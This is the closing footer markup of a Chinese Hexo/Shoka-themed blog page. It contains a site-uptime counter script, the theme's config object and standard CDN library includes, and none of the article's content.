    var siteSetupDate = new Date('2019-06-01'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
    setInterval(function() {
      var currentTime = new Date();
      var uptime = formatUptime(currentTime - siteSetupDate);
      siteUptimeElement.textContent = uptime;
    }, 1000);

    function formatUptime(milliseconds) {
      var seconds = Math.floor(milliseconds / 1000);
      var minutes = Math.floor(seconds / 60);
      var hours = Math.floor(minutes / 60);
      var days = Math.floor(hours / 24);

      var uptime = '';
      if (days > 0) {
        uptime += days + '天 ';
      }
      if (hours > 0) {
        uptime += (hours % 24) + '时 ';
      }
      if (minutes > 0) {
        uptime += (minutes % 60) + '分 ';
      }
      uptime += (seconds % 60) + '秒';

      return uptime;
    }
  </script>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/12/30/SAFE/10 免杀对抗/',
    favicon: {
      show: "Cryp71c3",
      hide: "十年磨一剑"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
